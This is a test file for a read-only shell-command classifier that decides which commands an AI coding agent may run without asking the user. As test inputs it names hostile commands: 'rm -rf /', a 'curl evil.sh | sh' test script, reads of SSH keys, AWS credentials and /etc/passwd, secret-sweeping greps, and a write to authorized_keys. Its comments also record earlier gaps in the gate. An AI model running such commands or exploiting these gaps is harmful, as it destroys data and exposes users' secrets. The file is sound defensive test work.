import { test } from 'node:test';
import assert from 'node:assert/strict';
import { isBashReadOnly, READ_ONLY_PREFIXES } from '../src/safety/bashReadOnly.js';

test('READ_ONLY_PREFIXES is exported and non-empty', () => {
  assert.ok(READ_ONLY_PREFIXES.length > 0);
  assert.ok(READ_ONLY_PREFIXES.includes('git status'));
});

test('isBashReadOnly allows common read-only commands', () => {
  assert.equal(isBashReadOnly('git status'), true);
  assert.equal(isBashReadOnly('git log --oneline -5'), true);
  assert.equal(isBashReadOnly('git diff HEAD~1'), true);
  assert.equal(isBashReadOnly('rg pattern src/'), true);
  assert.equal(isBashReadOnly('grep -r foo .'), true);
  assert.equal(isBashReadOnly('ls -la'), true);
  assert.equal(isBashReadOnly('cat README.md'), true);
  assert.equal(isBashReadOnly('head -n 20 file.txt'), true);
  assert.equal(isBashReadOnly('tail -f log.txt'), true);
  assert.equal(isBashReadOnly('find . -name "*.ts"'), true);
  assert.equal(isBashReadOnly('docker ps'), true);
  // `npm test` deliberately NOT here — see the T0-2 test below. It ran arbitrary workspace shell
  // with no prompt, and this line used to assert that as correct behavior.
  assert.equal(isBashReadOnly('pwd'), true);
});

test('isBashReadOnly rejects destructive or mutating commands', () => {
  assert.equal(isBashReadOnly('rm -rf /'), false);
  assert.equal(isBashReadOnly('git push origin main'), false);
  assert.equal(isBashReadOnly('npm install lodash'), false);
  assert.equal(isBashReadOnly('find . -delete'), false);
  assert.equal(isBashReadOnly('find . -exec rm {} \\;'), false);
});

test('isBashReadOnly normalizes leading $ and uses first pipeline segment', () => {
  assert.equal(isBashReadOnly('$ git status'), true);
  assert.equal(isBashReadOnly('git status | wc -l'), true);
  assert.equal(isBashReadOnly('echo hi && rm -rf /'), false);
});

test('isBashReadOnly never auto-allows a command substitution / subshell', () => {
  // A subshell can hide arbitrary work behind a read-only-looking prefix, so it
  // must fall through to the gate rather than ride the no-confirm fast path.
  assert.equal(isBashReadOnly('grep TODO $(git ls-files)'), false);
  assert.equal(isBashReadOnly('cat $(which node)'), false);
  assert.equal(isBashReadOnly('echo `id`'), false);
  assert.equal(isBashReadOnly('ls <(sort a.txt)'), false);
  // ...but plain parameter expansion does not execute, so it stays read-only.
  assert.equal(isBashReadOnly('echo ${HOME}'), true);
});
test('isBashReadOnly: fd-numbered file redirects are NOT read-only (security — no silent auto-write)', () => {
  // The old `[^0-9&]>` guard exempted any digit-before-`>`, so `1> f` slipped through and auto-wrote.
  assert.equal(isBashReadOnly('grep foo file 1> important.txt'), false, '1> writes a file — must gate');
  assert.equal(isBashReadOnly('grep foo file 2> out.txt'), false, '2> writes a file — must gate');
  assert.equal(isBashReadOnly('grep foo file 3> z'), false, '3> writes a file — must gate');
  assert.equal(isBashReadOnly('cat data > f'), false, 'plain > writes');
  assert.equal(isBashReadOnly('cat data >> f'), false, 'append writes');
  // fd DUPLICATION (2>&1) also gates conservatively (the `&` splits the chain) — safe: it never
  // auto-runs a write, it just asks. The security invariant is only that FILE redirects never slip through.
  assert.equal(isBashReadOnly('grep foo file 2>&1'), false, 'conservatively gates (safe over convenient)');
});

// ── T0-2 / T0-3 / T0-4 · the read-only fast path was not read-only ──────────────────────────
// Everything below returned TRUE before 2026-07-25 and therefore auto-ran with no prompt at the
// default autonomy. Each block names the mechanism, because "it's on a prefix list" is exactly
// how they got there.

test('T0-2: test runners are NOT read-only — scripts.test is arbitrary shell from the WORKSPACE', () => {
  for (const cmd of ['npm test', 'npm run test', 'npm run -s test', 'pnpm test', 'yarn test']) {
    assert.equal(isBashReadOnly(cmd), false, `${cmd} must gate`);
  }
  // A cloned repo declaring "test": "curl -s https://evil.sh | sh" is the whole point: the
  // denylist and pre_tool_use hooks only ever see the literal string `npm test`.
});

test('T0-4: write flags on read-looking commands are writes', () => {
  const writes = [
    'sort -o /tmp/x f',
    'sort --output=src/index.ts /dev/null',
    'sort --output /tmp/x f',
    'tree -o /tmp/out .',
    'git diff --output=src/index.ts',
    'git show --output /tmp/x',
    'uniq /tmp/payload /root/.ssh/authorized_keys',
    'find . -fprintf /tmp/p "%p\\n"',
    'find . -fprint0 /tmp/p',
    'find . -fprint /tmp/p',
  ];
  for (const cmd of writes) assert.equal(isBashReadOnly(cmd), false, `${cmd} WRITES a file`);
});

test('T0-4: the deny table does not over-reject the real read forms', () => {
  const reads = [
    'sort f',
    'sort -u -r f',
    'sort --reverse f',
    'tree -L 2 src',
    'git diff HEAD~1',
    'git show HEAD',
    'uniq -c f', // one operand + a flag → still a read
    'uniq f',
    'find . -name "*.ts"',
    'find . -type f -newer x',
  ];
  for (const cmd of reads) assert.equal(isBashReadOnly(cmd), true, `${cmd} is a read`);
});

test('T0-3: file reads are scoped to the granted roots', () => {
  const roots = ['/work/repo'];
  // In-jail reads keep the fast path.
  assert.equal(isBashReadOnly('cat /work/repo/src/index.ts', roots), true);
  assert.equal(isBashReadOnly('head -n 5 /work/repo/README.md', roots), true);
  assert.equal(isBashReadOnly('cat -n /work/repo/a.ts', roots), true, 'flags are not operands');
  assert.equal(isBashReadOnly('wc -l /work/repo/a.ts', roots), true);
  // Out-of-jail credential reads lose it — they fall through to the gate, they are not denied.
  assert.equal(isBashReadOnly('cat /Users/x/.ssh/id_rsa', roots), false);
  assert.equal(isBashReadOnly('cat /Users/x/.aws/credentials', roots), false);
  assert.equal(isBashReadOnly('head ../../outside.txt', roots), false);
  assert.equal(isBashReadOnly('stat /etc/passwd', roots), false);
  // A glob or an expansion could resolve anywhere, so it is never vouched for.
  assert.equal(isBashReadOnly('cat /work/repo/*.env', roots), false);
  assert.equal(isBashReadOnly('cat $SECRET', roots), false);
  // stdin and the null device are not files worth scoping.
  assert.equal(isBashReadOnly('wc -l -', roots), true);
});

test('T0-3: with no roots configured the classification is shape-only (unchanged behavior)', () => {
  // The classifier path may legitimately have no roots; scoping must not silently deny there.
  assert.equal(isBashReadOnly('cat /Users/x/.ssh/id_rsa'), true);
  assert.equal(isBashReadOnly('cat /Users/x/.ssh/id_rsa', []), true);
});

test('T0-3: scoping applies to EVERY stage of a pipeline', () => {
  const roots = ['/work/repo'];
  assert.equal(isBashReadOnly('cat /work/repo/a.txt | grep foo', roots), true);
  assert.equal(isBashReadOnly('grep foo /work/repo/a.txt | cat /Users/x/.netrc', roots), false);
});

// F07-02: recursive search commands (grep/rg/find) were read-only fast-path with NO operand scoping —
// `grep -rI password /etc /root ~/.config` and `rg -il token ~` and `find ~ -name id_rsa` auto-ran
// and their (possibly secret) output entered context. They now demote to the gate like the viewers.
test('F07-02: grep/rg/find/git-grep out-of-workspace scan roots demote to the gate', () => {
  const roots = ['/work/repo'];
  // Plan's exact acceptance examples must gate.
  assert.equal(isBashReadOnly('grep -rI foo /etc', roots), false, 'grep -rI into /etc gates');
  assert.equal(isBashReadOnly('rg -il token ~', roots), false, 'rg scanning ~ gates (tilde)');
  assert.equal(isBashReadOnly('find ~ -name x', roots), false, 'find from ~ gates (tilde)');
  // Multi-root secret sweep.
  assert.equal(isBashReadOnly('grep -rI password /etc /root /Users/x/.config', roots), false);
  assert.equal(isBashReadOnly('rg -il token /Users/x', roots), false);
  assert.equal(isBashReadOnly('find /Users/x -name id_rsa', roots), false);
  // Escaping relative path.
  assert.equal(isBashReadOnly('grep -r foo ../../outside', roots), false);
  assert.equal(isBashReadOnly('rg foo ../..', roots), false);
  // Absolute out-of-jail single path.
  assert.equal(isBashReadOnly('grep foo /etc/passwd', roots), false);
  assert.equal(isBashReadOnly('find /etc -name passwd', roots), false);
  // `git grep -- pathspec`: git grep was never on the read-only fast path at all, so it gates
  // regardless — confirmed in the in-workspace test below.
});

test('F07-02: in-workspace grep/rg/find STILL auto-run (no UX regression)', () => {
  const roots = ['/work/repo'];
  assert.equal(isBashReadOnly('grep -r foo .', roots), true);
  assert.equal(isBashReadOnly('rg pattern src/', roots), true);
  assert.equal(isBashReadOnly('grep -rn foo /work/repo/src', roots), true);
  assert.equal(isBashReadOnly('find . -name "*.ts"', roots), true);
  assert.equal(isBashReadOnly('find /work/repo -name a.ts', roots), true);
  // A pattern-only grep (reads stdin) has no path operand to scope.
  assert.equal(isBashReadOnly('grep foo', roots), true);
  // NOTE: `git grep` was NEVER on the read-only fast path (no `git grep` prefix exists), so it gates
  // regardless of operands — there is no out-of-jail gap to close and no behavior to preserve.
  assert.equal(isBashReadOnly('git grep foo', roots), false);
  assert.equal(isBashReadOnly('git grep foo -- ./src', roots), false);
  // Value-taking options must NOT be mistaken for path operands.
  assert.equal(isBashReadOnly('grep -e /work/repo/x -m 3 foo src/', roots), true);
  assert.equal(isBashReadOnly('rg --glob=src/** foo /work/repo', roots), true);
  assert.equal(isBashReadOnly('grep --include="*.ts" foo /work/repo', roots), true);
});

test('F07-02: shape-only classification (no roots) keeps grep/rg/find auto-allowed', () => {
  // The classifier may run with no roots; scoping must not deny there (unchanged behavior).
  assert.equal(isBashReadOnly('grep -r foo /etc'), true);
  assert.equal(isBashReadOnly('rg -il token ~'), true);
  assert.equal(isBashReadOnly('find / -name x'), true);
  assert.equal(isBashReadOnly('grep foo /etc/passwd', []), true);
});
